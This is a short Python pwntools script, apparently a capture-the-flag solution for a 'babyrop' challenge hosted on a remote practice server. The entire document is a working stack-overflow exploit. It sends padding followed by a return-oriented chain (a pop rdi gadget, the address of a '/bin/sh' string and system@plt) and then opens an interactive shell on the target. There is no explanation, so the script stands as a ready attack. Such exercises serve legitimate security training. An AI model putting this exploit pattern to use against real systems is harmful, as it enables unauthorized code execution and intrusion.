from pwn import *

elf = ELF("./babyrop")
context.arch = 'amd64'
pop_rdi_ret = 0x400683
bin_sh_addr = 0x601048
r = remote("node3.buuoj.cn", 25552)
r.recvuntil("name? ")
r.sendline("a" * 0x18 + flat([pop_rdi_ret, bin_sh_addr, elf.plt["system"]]))
r.interactive()
